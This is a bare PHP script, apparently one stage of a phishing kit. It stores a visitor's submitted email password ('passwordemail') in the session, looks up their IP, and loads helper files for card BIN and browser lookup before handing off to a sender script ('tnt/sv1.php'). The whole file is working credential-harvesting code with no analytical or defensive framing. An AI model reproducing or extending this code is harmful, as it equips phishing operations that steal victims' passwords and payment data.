<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');
$_SESSION['loged'] = "loged5";

$_SESSION['TIME_DATE'] = $TIME_DATE;

include("system.php");
include("function.php");

$_SESSION['_passwordemail_']     = $_POST['passwordemail'];

$ip=$_SESSION['ip']=getip();




include('../tnt/sv1.php');
?>




